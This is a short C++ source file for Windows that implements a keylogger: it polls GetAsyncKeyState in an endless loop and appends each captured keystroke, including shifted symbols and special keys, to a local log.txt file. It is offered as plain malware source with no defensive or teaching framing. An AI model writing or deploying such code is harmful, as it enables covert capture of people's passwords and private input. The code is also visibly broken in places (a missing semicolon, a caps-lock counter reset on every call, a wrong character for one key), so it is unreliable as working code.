#include <fstream>
#include <Windows.h>
#include <iostream>

using namespace std;

int save(int key);

int main()
{
	char input;
	while (true)
	{
		for (input = 8; input <= 127; input++)
		{
			if (GetAsyncKeyState(input) == -32767)
				save(input);
		}
	}
	return 0;
}

int save(int key)
{
	int i = 0;
	ofstream fout;
	fout.open("log.txt", ios::out | ios::app);

	if (key == 8)
		fout << "[backspace]";

	else if (key == 9)
		fout << "[horizontal tab]";

	else if (key == 32)
		fout << "[space]"
			 << " ";
	else if (key == 13)
		fout << endl
			 << "[enter]" << endl;
	else if (key == 20)
	{
		if (i % 2 == 0)
			fout << "[capsON]";
		else
			fout << "capsOFF";
		i++;
	}

	else if (GetAsyncKeyState(VK_SHIFT))
	{
		switch (key)
		{
		case 33:
			fout << "!" break;

		case 34:
			fout << "\"";
			break;
			// It can vary by keyboard.
		case 35:
			fout << "#";
			break;
			// It can vary by keyboard.
		case 36:
			fout << "$";
			break;
			// It can vary by keyboard.
		case 37:
			fout << "%";
			break;
			// It can vary by keyboard.
		case 94:
			fout << "^";
			break;
			// It can vary by keyboard.
		case 38:
			fout << "&";
			break;
			// It can vary by keyboard.
		case 42:
			fout << "*";
			break;
			// It can vary by keyboard.
		case 40:
			fout << "(";
			break;
			// It can vary by keyboard.
		case 41:
			fout << ":";
			break;
			// It can vary by keyboard.
		case 43:
			fout << "+";
			break;
			// It can vary by keyboard.
		case 60:
			fout << "<";
			break;
			// It can vary by keyboard.
		case 95:
			fout << "_";
			break;

		case 62:
			fout << ">";
			break;

		case 63:
			fout << "?";
			break;
			// It can vary by keyboard.
		case 126:
			fout << "~";
			break;
			// It can vary by keyboard.
		case 123:
			fout << "{";
			break;
			// It can vary by keyboard.
		case 124:
			fout << "|";
			break;
			// It can vary by keyboard.
		case 125:
			fout << "}";
			break;
			// It can vary by keyboard.

		default:
			break;
		}
	}
        else if(key>=48&&key<=57)
		fout<<(char)key;
	
	else
	{
		if (GetAsyncKeyState(VK_CAPITAL))
			fout << (char)key;
		else
		{
			if (i % 2 == 0)
				fout << (char)(key + 32);
			else
				fout << (char)key;
		}
	}
	fout.close();
	return 0;
}
